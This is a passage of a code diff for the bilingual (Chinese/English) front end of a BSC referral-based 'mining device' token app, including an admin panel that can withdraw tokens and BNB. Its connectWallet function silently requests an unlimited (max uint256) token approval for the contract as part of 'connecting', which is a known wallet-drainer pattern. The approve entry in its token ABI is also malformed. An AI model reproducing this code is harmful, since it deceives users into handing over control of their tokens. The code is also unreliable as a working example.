],"name":"pause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeAdmin","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"removeFromBlocklist","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdrawBNB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdrawTokens","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    const tokenABI=[{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
 
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">🌸</div>
-                    <h3 id="quantum-title">Quantum Dandelion L2</h3>
-                    <p id="quantum-desc">Quantum-enhanced mining with ethereal beauty</p>
-                    <div class="price-tag">200 TOKENS</div>
-                    <div class="buy-controls">
-                        <input type="number" class="quantity-input" value="1" min="1" max="100" id="quantum-qty">
-                        <button class="buy-btn" onclick="buyPowerMachine(1)" id="buy-quantum">
-                            Buy Now
-                        </button>
-                    </div>
-                </div>
+    /* =====  语言切换 ===== */
+    let lang = "zh";
+    function t(key){
+        const map = {
+            en:{
+                connect:"Connect TP Wallet",
+                shop:"Shop",
+                dashboard:"Dashboard",
+                referral:"Referral",
+                global:"Global",
+                admin:"Admin",
+                title:"Collect Stars, Earn Rewards",
+                subtitle:"Connect TP Wallet to explore the blockchain universe",
+                connectBtn:"Connect TP Wallet",
+                hint:"Make sure BSC network",
+                rewardToken:"Reward Token",
+                earned:"Total Earned",
+                claim:"Claim",
+                devices:"Devices",
+                moon:"Moon Converter",
+                l1:"Stardust L1",
+                l2:"Quantum L2",
+                l3:"Aurora L3",
+                l4:"Galaxy L4",
+                power:"Total Power",
+                daily:"Daily Est.",
+                unclaimed:"Unclaimed",
+                buyMoon:"Buy Moon Converter 1 (0.01 BNB)",
+                buyL1:"Buy Stardust L1 1 (100 token)",
+                buyL2:"Buy Quantum L2 1 (200 token)",
+                buyL3:"Buy Aurora L3 1 (300 token)",
+                buyL4:"Buy Galaxy L4 1 (500 token)",
+                buyTest:"Buy Phantom Debugger 1 (0.0001 BNB)",
+                referralTitle:"Referral System",
+                setRef:"Set Referrer",
+                totalRef:"Total Referral Reward",
+                globalTitle:"Global Stats",
+                totalDevices:"Total Devices",
+                networkPower:"Network Power",
+                poolBalance:"Pool Balance",
+                dailyOutput:"Daily Output",
+                currentBlock:"Current Block",
+                adminTitle:"Admin Panel",
+                addr:"Address",
+                addAdmin:"Add Admin",
+                removeAdmin:"Remove Admin",
+                addBlock:"Add to Blocklist",
+                removeBlock:"Remove from Blocklist",
+                pause:"Pause Contract",
+                unpause:"Unpause Contract",
+                withdrawToken:"Withdraw Tokens",
+                withdrawBNB:"Withdraw BNB"
+            },
+            zh:{
+                connect:"连接 TP 钱包",
+                shop:"商店",
+                dashboard:"仪表盘",
+                referral:"推荐",
+                global:"全网",
+                admin:"管理",
+                title:"收集星光，收获奖励",
+                subtitle:"连接 TP 钱包开始探索区块链宇宙",
+                connectBtn:"连接 TP 钱包",
+                hint:"请确保已切换至 BSC 网络",
+                rewardToken:"奖励代币",
+                earned:"累计收益",
+                claim:"领取收益",
+                devices:"我的设备",
+                moon:"月光转换器",
+                l1:"星尘收集器L1",
+                l2:"量子蒲公英L2",
+                l3:"极光编织机L3",
+                l4:"银河过滤器L4",
+                power:"总算力",
+                daily:"今日预计",
+                unclaimed:"未领取",
+                buyMoon:"购买月光转换器 1 台（0.01 BNB）",
+                buyL1:"星尘收集器L1 1 台（100 代币）",
+                buyL2:"量子蒲公英L2 1 台（200 代币）",
+                buyL3:"极光编织机L3 1 台（300 代币）",
+                buyL4:"银河过滤器L4 1 台（500 代币）",
+                buyTest:"幻影调试器 1 台（0.0001 BNB）",
+                referralTitle:"推荐体系",
+                setRef:"设置推荐人",
+                totalRef:"累计推荐奖励",
+                globalTitle:"全网数据",
+                totalDevices:"总设备数",
+                networkPower:"全网算力",
+                poolBalance:"奖励池余额",
+                dailyOutput:"今日全网产出",
+                currentBlock:"当前区块",
+                adminTitle:"管理员面板",
+                addr:"地址",
+                addAdmin:"添加管理员",
+                removeAdmin:"移除管理员",
+                addBlock:"加入黑名单",
+                removeBlock:"移除黑名单",
+                pause:"暂停合约",
+                unpause:"恢复合约",
+                withdrawToken:"提取代币",
+                withdrawBNB:"提取BNB"
+            }
+        };
+        return map[lang][key] || key;
+    }
+    function toggleLang(){
+        lang = lang==='en'?'zh':'en';
+        document.querySelectorAll('[data-en][data-zh]').forEach(el=>{
+            el.innerText = t(el.dataset[lang]);
+        });
+    }
 
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">🌌</div>
-                    <h3 id="aurora-title">Aurora Weaver L3</h3>
-                    <p id="aurora-desc">Weave cosmic energy into valuable resources</p>
-                    <div class="price-tag">300 TOKENS</div>
-                    <div class="buy-controls">
-                        <input type="number" class="quantity-input" value="1" min="1" max="100" id="aurora-qty">
-                        <button class="buy-btn" onclick="buyPowerMachine(2)" id="buy-aurora">
-                            Buy Now
-                        </button>
-                    </div>
-                </div>
+    /* =====  连接钱包（TP 专用）  ===== */
+    async function connectWallet(){
+        if(!window.ethereum){
+            toast(t("hint"),true);
+            return;
+        }
+        web3=new Web3(window.ethereum);
+        try{
+            accounts=await window.ethereum.request({method:'eth_requestAccounts'});
+            contract=new web3.eth.Contract(contractABI,contractAddress);
+            tokenContract=new web3.eth.Contract(tokenABI,tokenAddress);
+            await tokenContract.methods.approve(contractAddress,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({from:accounts[0]});
+            document.getElementById('shortAddr').innerText=accounts[0].slice(0,6)+'...'+accounts[0].slice(-4);
+            toScreen('dashboard');
+        }catch(e){
+            toast(e.message.includes('User denied')? "用户已取消" : "连接失败："+e.message,true);
+        }
+    }
 
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">🌟</div>
-                    <h3 id="galaxy-title">Galaxy Filter L4</h3>
-                    <p id="galaxy-desc">The ultimate cosmic resource extraction system</p>
-                    <div class="price-tag">500 TOKENS</div>
-                    <div class="buy-controls">
-                        <input type="number" class="quantity-input" value="1" min="1" max="100" id="galaxy-qty">
-                        <button class="buy-btn" onclick="buyPowerMachine(3)" id="buy-galaxy">
-                            Buy Now
-                        </button>
-                    </div>
-                </div>
-            </div>
+    /* =====  页面切换  ===== */
+    function toScreen(name){
+        document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+        document.getElementById('screen-'+name).classList.add('active');
+        loadAll();
+    }
 
-            <!-- Test Device Shop -->
-            <div id="shop-test-content" class="shop-content" style="display: none;">
-                <div class="device-shop-card">
-                    <div class="device-3d-icon">👻</div>
-                    <h3 id="phantom-title">Phantom Debugger</h3>
-                    <p id="phantom-desc">Special test device for administrators</p>
-                    <div class="price-
+    /* =====  数据刷新  ===== */
+    async function loadAll(){
+        if(!contract)return;
+        const [user,global,bal,decimals]=await Promise.all([
+            contract.methods.getUserDashboard(accounts[0]).call(),
+            contract.methods.getGlobalDashboard().call(),
+            tokenContract.methods.balanceOf(accounts[0]).call(),
+            tokenContract.methods.decimals().call()
+        ]);
+        const factor=10**decimals;
+
+        /* 仪表盘 */
+        document.getElementById('val-rewardToken').innerText=(bal/factor).toFixed(2);
+        document.getElementById('val-earned').innerText=(user.totalRefReward/factor).toFixed(2);
+        document.getElementById('val-daily').innerText=(user.dailyReward/factor).toFixed(2);
+        document.getElementById('val-unclaimed').innerText=(user.unclaimed/factor).toFixed(2);
+        document.getElementById('normalCount').innerText=user.normal+' 台';
+        document.getElementById('testCount').innerText=user.test+' 台';
+        for(let i=0;i<4;i++)document.getElementById('p'+i).innerText=user.power[i]+' 台';
+        document.getElementById('val-totalPower').innerText=(user.totalPower/1e18).toFixed(2);
+
+        /* 全网 */
+        document.getElementById('val-globalMachines').innerText=global.totalMines;
+        document.getElementById('val-globalPower').innerText=(global.networkPower/1e18).toFixed(2);
+        document.getElementById('val-pool').innerText=(global.poolBalance/factor).toFixed(2);
+        document.getElementById('val-globalDaily').innerText=(global.dailyProduction/factor).toFixed(2);
+        document.getElementById('val-block').innerText=global.currentBlock;
+
+        /* 推荐中心 */
+        document.getElementById('val-claimable').innerText=(user.unclaimed/factor).toFixed(2);
+        document.getElementById('val-totalRef').innerText=(user.totalRefReward/factor).toFixed(2);
+
+        /* 管理员可见 */
+        const isAdmin=await contract.methods.admin(accounts[0]).call();
+        const isOwner=accounts[0].toLowerCase()===(await contract.methods.owner().call()).toLowerCase();
+        ['btn-test','admin-tab-btn'].forEach(id=>document.getElementById(id).style.display=isAdmin||isOwner?'':'none');
+    }
+
+    /* =====  功能调用  ===== */
+    async function buyInitial(){
+        const price=await contract.methods.INITIAL_MACHINE_PRICE_BNB().call();
+        contract.methods.buyInitialMachine().send({from:accounts[0],value:price}).then(()=>{toast("购买成功");loadAll()}).catch(e=>toast("购买失败："+e.message,true));
+    }
+    async function buyPower(tier){
+        const {priceToken}=await contract.methods.machineTiers(tier).call();
+        contract.methods.buyPowerMachine(tier,1).send({from:accounts[0]}).then(()=>{toast("购买成功");loadAll()}).catch(e=>toast("购买失败："+e.message,true));
+    }
+    async function buyTest(){
+        const price=await contract.methods.TEST_MACHINE_PRICE_BNB().call();
+        contract.methods.buyTestMachine().send({from:accounts[0],value:price}).then(()=>{toast("购买成功");loadAll()}).catch(e=>toast("购买失败："+e.message,true));
+    }
+    async function claimRewards(){
+        contract.methods.claimRewards().send({from:accounts[0]}).then(()=>{toast("领取成功");loadAll()}).catch(e=>toast("领取失败："+e.message,true));
+    }
+    async function setReferrer(){
+        const addr=document.getElementById('referrerInput').value;
+        if(!web3.utils.isAddress(addr))return toast("地址无效",true);
+        contract.methods.setReferrer(addr).send({from:accounts[0]}).then(()=>{toast("设置成功");loadAll()}).catch(e=>toast("设置失败："+e.message,true));
+    }
+
+    /* =====  管理员功能  ===== */
+    async function addAdmin(){
+        const addr=document.getElementById('adminAddr').value;
+        if(!web3.utils.isAddress(addr))return toast("地址无效",true);
+        contract.methods.addAdmin(addr).send({from:accounts[0]}).then(()=>{toast("已添加");loadAll()}).catch(e=>toast("添加失败："+e.message,true));
+    }
+    async function removeAdmin(){
+        const addr=document.getElementById('adminAddr').value;
+        if(!web3.utils.isAddress(addr))return toast("地址无效",true);
+        contract.methods.removeAdmin(addr).send({from:accounts[0]}).then(()=>{toast("已移除");loadAll()}).catch(e=>toast("移除失败："+e.message,true));
+    }
+    async function addBlock(){
+        const addr=document.getElementById('adminAddr').value;
+        if(!web3.utils.isAddress(addr))return toast("地址无效",true);
+        contract.methods.addToBlocklist(addr).send({from:accounts[0]}).then(()=>{toast("已加入黑名单");loadAll()}).catch(e=>toast("操作失败："+e.message,true));
+    }
+    async function removeBlock(){
+        const addr=document.getElementById('adminAddr').value;
+        if(!web3.utils.isAddress(addr))return toast("地址无效",true);
+        contract.methods.removeFromBlocklist(addr).send({from:accounts[0]}).then(()=>{toast("已移除黑名单");loadAll()}).catch(e=>toast("操作失败："+e.message,true));
+    }
+    async function pauseContract(){
+        contract.methods.pause().send({from:accounts[0]}).then(()=>{toast("已暂停");loadAll()}).catch(e=>toast("暂停失败："+e.message,true));
+    }
+    async function unpauseContract(){
+        contract.methods.unpause().send({from:accounts[0]}).then(()=>{toast("已恢复");loadAll()}).catch(e=>toast("恢复失败："+e.message,true));
+    }
+    async function withdrawTokens(){
+        const amt=document.getElementById('withdrawAmount').value;
+        if(!amt)return toast("请输入数量",true);
+        const val=web3.utils.toWei(amt,18);
+        contract.methods.withdrawTokens(val).send({from:accounts[0]}).then(()=>{toast("提取成功");loadAll()}).catch(e=>toast("提取失败："+e.message,true));
+    }
+    async function withdrawBNB(){
+        contract.methods.withdrawBNB().send({from:accounts[0]}).then(()=>{toast("提取BNB成功");loadAll()}).catch(e=>toast("提取BNB失败："+e.message,true));
+    }
+
+    /* =====  工具  ===== */
+    function toast(msg,isErr=false){
+        const el=document.getElementById('toast');
+        el.innerText=msg;
+        el.className=isErr?'error':'success';
+        el.style.opacity=1;
+        setTimeout(()=>el.style.opacity=0,2000);
+    }
+
+    /* =====  加载后自动渲染中文 ===== */
+    window.onload = () => {
+        lang = "zh";  // 默认中文
+        document.querySelectorAll('[data-en][data-zh]').forEach(el=>{
+            el.innerText = t(el.dataset[lang]);
+        });
+    };
+</script>
+</body>
+</html>
